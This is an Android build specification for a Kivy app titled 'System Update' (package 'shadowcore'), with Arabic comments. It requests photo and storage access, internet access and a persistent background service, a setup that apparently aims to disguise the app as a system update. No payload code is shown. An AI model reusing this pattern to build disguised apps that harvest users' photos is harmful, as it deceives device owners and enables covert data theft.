[app]
title = System Update
package.name = shadowcore
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.4

requirements = python3,kivy,pyjnius,requests,certifi

orientation = portrait

# صلاحيات أندرويد 13+
android.permissions = INTERNET,FOREGROUND_SERVICE,WAKE_LOCK,READ_MEDIA_IMAGES,READ_EXTERNAL_STORAGE

android.api = 33
android.minapi = 21

# اسم الخدمة يجب أن يطابق ما استدعيناه في main.py
services = Myservice:service.py

android.foreground_service = True
android.wakelock = True
android.copy_libs = 1

[buildozer]
log_level = 2
warn_on_root = 1
